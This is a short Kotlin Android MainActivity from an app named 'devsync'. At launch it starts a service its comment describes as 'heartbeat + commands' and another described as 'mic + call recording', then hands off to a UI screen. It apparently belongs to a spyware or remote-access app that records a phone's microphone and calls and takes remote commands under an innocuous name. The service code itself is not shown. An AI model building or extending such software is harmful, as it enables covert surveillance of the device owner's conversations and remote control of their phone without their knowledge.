package com.example.devsync

import android.content.Intent
import android.os.Build
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Start DeviceSyncService (heartbeat + commands)
        startSvc(DeviceSyncService::class.java)

        // Start RecordingService (mic + call recording)
        startSvc(RecordingService::class.java)

        startActivity(Intent(this, UserInterfaceActivity::class.java))
        finish()
    }

    private fun <T> startSvc(cls: Class<T>) {
        val intent = Intent(this, cls)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            startForegroundService(intent)
        else
            startService(intent)
    }
}
